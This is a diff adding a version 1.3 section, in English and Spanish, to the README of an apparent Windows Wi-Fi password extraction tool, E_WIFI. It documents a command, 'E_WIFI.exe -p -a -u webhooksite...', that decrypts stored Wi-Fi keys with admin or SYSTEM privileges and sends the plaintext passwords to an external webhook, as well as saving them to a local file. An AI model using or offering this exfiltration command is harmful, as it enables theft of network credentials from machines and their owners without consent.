@@ -58,3 +58,26 @@ type --help for more detailed info
 
 PD: THE TXT IS CREATED BY DEFAULT -n TURN IT OFF
     EL TXT SE CREA POR DEFECTO -n APAGA LA CREACION
+
+V1.3
+
+Quick Example of the new function (in the following hours I will update a more detailed one)
+Ejemplo rapido de la nueva funcion (en las siguientes horas actualizare con unos ejemplos mas detallados)
+
+E_WIFI.exe -p -a -u webhooksite...
+![ejemplo nueva funcion](https://user-images.githubusercontent.com/74321905/225491588-1b1c1de4-0fa2-4981-8aa7-317983d13d6a.png)
+
+"-a" will answer automatically with "Y" because it indicates that the current console is with admin privileges at least if you don't put this option you will need to put manually the option
+"-a" respondera automaticamente con "Y" porque indica que la consola actual tiene al menos privilegios de administrador, si no pones esta opcion tendras que responder manualmente
+
+You will see that in the webhook it will be sent with the decrypted password
+Podras ver en el webhook que sera enviado con la contrasena desencriptada
+![ejemplo nueva funcion2](https://user-images.githubusercontent.com/74321905/225492226-b03d05e1-4f79-4f88-b872-04df838bc34d.png)
+
+
+Also you can use the E_WIFI to extract the keys and then manually use Wdecryptor with a opened system authority cmd
+Tambien podras usar E_WIFI para extraer las keys y luego manualmente usar wdecryptor con una cmd abierta con system authority
+![ejemplo nueva funcion3](https://user-images.githubusercontent.com/74321905/225492473-c7c2d505-e762-40c4-b96c-6e7045184f49.png)
+
+it will be saved in a "decrypted.txt" file also with the following format "Encrypted Key : Decrypted"
+tambien se guardara en un archivo "decrypted.txt" con el siguiente formato "Key Encriptada : Descriptada"
